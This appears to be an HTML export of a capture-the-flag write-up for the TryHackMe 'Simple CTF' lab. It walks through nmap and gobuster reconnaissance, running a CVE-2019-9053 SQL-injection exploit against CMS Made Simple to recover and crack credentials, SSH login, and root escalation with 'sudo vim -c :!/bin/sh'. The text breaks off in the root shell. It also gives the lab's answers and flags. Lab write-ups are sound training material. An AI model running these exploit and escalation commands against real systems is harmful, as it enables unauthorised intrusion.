@@ -1,0 +1,802 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SimpleCTF : THM</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="aa5daff9-a99a-4816-8b46-66fb1ce6d887" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png"/></div><h1 class="page-title">SimpleCTF : THM</h1><p class="page-description"></p></header><div class="page-body"><p id="51b68917-ce59-484b-90e6-7963b20e842e" class="">Write-Ups by : drew-byte</p><h2 id="9de1ba1b-55e5-4e36-b026-a5f7c5e2f9e0" class="">Connection</h2><ul id="425a85d9-c4ae-49db-b77d-4e2d08acde71" class="bulleted-list"><li style="list-style-type:disc">Download the ovpn provided by the thm</li></ul><ul id="dc4dbc37-2b82-4e2b-b042-6491bfcbd640" class="bulleted-list"><li style="list-style-type:disc">Run the ovpn</li></ul><pre id="0d5dceac-4d9a-4ad7-bdf0-70dbd8a6f01b" class="code"><code>┌─[drew@parrot]─[~]
+└──╼ $cd Desktop
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo openvpn shanetydraw.ovpn</code></pre><hr id="a3c561bf-bc46-4409-9c67-a1201a65e080"/><h2 id="9924603f-37f6-48f7-bfe2-63cda3e8f322" class="">How many services are running under port 1000?</h2><ul id="7b6579a4-1674-40b0-9d2c-41dd6d1ede84" class="bulleted-list"><li style="list-style-type:disc">Scan port 0-1000 to the specific &lt;ip&gt;</li></ul><pre id="d9e1e405-2d39-41d1-ae8e-26b88cc3990d" class="code"><code>┌─[drew@parrot]─[~]
+└──╼ $nmap -p 0-1000 10.10.85.133 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 11:48 PST
+Nmap scan report for simplectf (10.10.85.133)
+Host is up (0.38s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds</code></pre><p id="b6e42318-4322-470e-8777-3bb72535711a" class="">ANSWER : 2</p><h2 id="cf8ebe3a-c260-41b6-be8b-ae67a63ad3a0" class="">What is running on the higher port?</h2><pre id="b174d54d-bea4-454b-8d20-39ac40b06feb" class="code"><code>[drew@parrot]─[~]
+└──╼ $nmap -A -p 0-3000 10.10.85.133 -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 11:53 PST
+Nmap scan report for simplectf (10.10.85.133)
+Host is up (0.38s latency).
+Not shown: 2998 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#x27;t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.4.26.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 294269149ecad917988c27723acda923 (RSA)
+|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
+|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.31 seconds</code></pre><p id="3e0ad2d3-e914-449b-9112-843519d56fff" class="">ANSWER : ssh</p><h2 id="23f1e69a-79f8-432c-85de-407ba032fad7" class="">What&#x27;s the CVE you&#x27;re using against the application?</h2><ul id="01a4832c-22a1-4729-a99a-15636738e011" class="bulleted-list"><li style="list-style-type:disc">Set up reverse proxy</li></ul><pre id="de620f9b-3668-4b1b-8b2f-d7278327c708" class="code"><code>┌─[drew@parrot]─[~]
+└──╼ $sudo nano /etc/hosts
+[sudo] password for drew:</code></pre><ul id="7b9001ac-a603-4808-a400-e50ef46941cd" class="bulleted-list"><li style="list-style-type:disc">Inside the nano paste the &lt;ip&gt; of the machine</li></ul><pre id="5abb0bae-96d5-4b7d-9a81-61ae9fdf97ca" class="code"><code># Host addresses
+127.0.0.1  localhost
+127.0.1.1  parrot
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+# Others
+
+10.10.85.133 simplectf</code></pre><ul id="d126c9e1-29dc-4d4e-bb6b-86702b0fe80e" class="bulleted-list"><li style="list-style-type:disc">Now paste the ip to the browser or the name you input in to the reverse proxy</li></ul><figure id="05e3b49b-c6fe-4d2a-b460-3cf68bd89e00" class="image"><a href="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled.png"><img style="width:881px" src="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled.png"/></a></figure><ul id="3c7c7775-983c-47fe-a8cc-7dde3aa0530c" class="bulleted-list"><li style="list-style-type:disc">No results. So we need to find hidden directories to access main the page and I use gobuster</li></ul><pre id="0dc6f7de-000b-4ef0-9757-0f0aee2abad8" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $gobuster dir -u http://10.10.85.133 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.85.133
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/05/24 12:11:08 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 296]
+/.hta                 (Status: 403) [Size: 291]
+/.htaccess            (Status: 403) [Size: 296]
+/index.html           (Status: 200) [Size: 11321]
+/robots.txt           (Status: 200) [Size: 929]  
+/server-status        (Status: 403) [Size: 300]  
+/simple               (Status: 301) [Size: 313] [--&gt; http://10.10.85.133/simple/]
+                                                                                 
+===============================================================
+2023/05/24 12:14:06 Finished
+===============================================================</code></pre><ul id="e7176238-b3fd-4817-9396-a3a265c1539a" class="bulleted-list"><li style="list-style-type:disc">Now the hidden directory is /simple </li></ul><ul id="16a52bb0-4175-4dcb-93ac-422c1be38334" class="bulleted-list"><li style="list-style-type:disc">Now access the directory to website and find the version of the website<figure id="35760eaf-c252-4ed0-904e-99373c695660" class="image"><a href="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled%201.png"><img style="width:268px" src="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled%201.png"/></a></figure></li></ul><ul id="af3e59cb-3801-4f11-8583-dfc8bf0cc56c" class="bulleted-list"><li style="list-style-type:disc">CMS Made Simple 2.2.8<figure id="68348fd8-35cf-44ee-ae42-3a6f6b9782e3" class="image"><a href="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled%202.png"><img style="width:1277px" src="SimpleCTF%20THM%20aa5daff9a99a48168b4666fb1ce6d887/Untitled%202.png"/></a></figure></li></ul><p id="0f53c738-c4fe-44fa-b6c5-fbde7d181ac4" class="">ANSWER : CVE-2019-9053</p><h2 id="756d5a90-de9a-4751-ab55-43121f05f3d9" class="">To what kind of vulnerability is the application vulnerable?</h2><p id="21c98d92-a084-406d-9d24-9346eb3e2050" class="">ANSWER : SQLi</p><h2 id="37c88922-b8d9-4f7b-a608-78f487e40139" class="">What&#x27;s the password?</h2><ul id="96146451-180d-43eb-a753-aba9dfd15045" class="bulleted-list"><li style="list-style-type:disc">Apply the exploit “<a href="https://www.exploit-db.com/exploits/46635">46635</a>.py” get the data in </li></ul><figure id="26f13392-ab78-4fc0-a05b-380f9c6ad81c"><div class="source">https://github.com/e-renna/CVE-2019-9053</div></figure><p id="ab72a7b8-6f48-4e6f-ac75-544ec867e591" class="">because the exploit in the “<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>” is not functioning</p><pre id="6aca047b-5a12-4bdd-ae39-70133c60ad14" class="code code-wrap"><code>$python3 46635.py -u http://10.10.85.133/simple/ --crack -w /usr/share/wordlists/best110.txt</code></pre><ul id="218a125e-8c1f-4935-86c9-17d321ffae68" class="bulleted-list"><li style="list-style-type:disc">Output of the gobuster</li></ul><pre id="798319d6-f0c6-4bde-a409-c17dc2b62007" class="code"><code>[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret</code></pre><h2 id="30200c82-5127-4dc0-bf3f-a2096bcd0335" class="">What&#x27;s the password?</h2><p id="12025217-cc02-4a30-adc6-da701dd8df66" class="">ANSWER : secret</p><h2 id="2405c987-cecf-4e50-8419-356489cd79b1" class="">Where can you login with the details obtained?</h2><ul id="ce9328b0-1b07-4eed-a117-e76dfc08a5f7" class="bulleted-list"><li style="list-style-type:disc">The port 2222 is ssh</li></ul><p id="c7a9521a-d2ec-4c49-9c12-d4962bb500aa" class="">ANSWER : SSH</p><ul id="15bbd552-1f0d-4e31-a5f0-90bf00de5faf" class="bulleted-list"><li style="list-style-type:disc">Access the account of mitch using ssh port 2222</li></ul><pre id="5bf47da8-0388-4275-b7a8-2a24acea486a" class="code code-wrap"><code>┌─[✗]─[drew@parrot]─[~]
+└──╼ $ssh mitch@10.10.85.133 -p 2222
+mitch@10.10.85.133&#x27;s password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190</code></pre><h2 id="0c6ae6ed-c017-4218-8994-d17d3256db45" class="">What&#x27;s the user flag?</h2><pre id="0adb208a-fd18-4407-8a1e-a102246e39d6" class="code"><code>$ ls -a
+.   .bash_history  .bashrc  .profile  .viminfo
+..  .bash_logout   .cache   user.txt
+$ cat user.txt
+G00d j0b, keep up!</code></pre><p id="1784a333-113b-4af4-aacc-decb181f82d5" class="">ANSWER : G00d j0b, keep up!</p><h2 id="dbfa58f1-47f7-49f3-ab7b-900cac9ebb0f" class="">Is there any other user in the home directory? What&#x27;s its name?</h2><pre id="f69bca21-7782-458d-abbf-7f966b3c72fe" class="code"><code>$ cd /
+$ ls -a
+.    boot   etc		initrd.img.old	media  proc  sbin  sys	var
+..   cdrom  home	lib		mnt    root  snap  tmp	vmlinuz
+bin  dev    initrd.img	lost+found	opt    run   srv   usr	vmlinuz.old
+$ cd home
+$ ls -a
+.  ..  mitch  sunbath</code></pre><p id="bd9b1fa9-8eb5-4916-af1a-efaddca8e646" class="">ANSWER : sunbath</p><h2 id="02266f04-ac47-4655-b5d5-266e18ef3dda" class="">What can you leverage to spawn a privileged shell?</h2><pre id="cf6c4684-733a-41b9-af4b-dcbd9335161e" class="code"><code>$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim</code></pre><ul id="31f9bcc4-a806-493c-9b07-142a14fc5585" class="bulleted-list"><li style="list-style-type:disc">Go to </li></ul><figure id="831ade49-1efa-49d0-9afa-4fb0cc5dc69f"><a href="https://gtfobins.github.io/gtfobins/vim/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">vim
+            
+            |
+            
+            GTFOBins</div></div><div class="bookmark-href"><img src="https://gtfobins.github.io/assets/logo.png" class="icon bookmark-icon"/>https://gtfobins.github.io/gtfobins/vim/</div></div></a></figure><p id="ed8a8395-f5cd-4d94-900f-ef4658348ec1" class="">and find the privilege of sudo in vim and paste the <code>sudo vim -c &#x27;:!/bin/sh&#x27;</code></p><pre id="7c0a5479-7c39-4f68-b3fc-fd31d8653fda" class="code"><code># sudo -l
+User root may run the following commands on Machine:
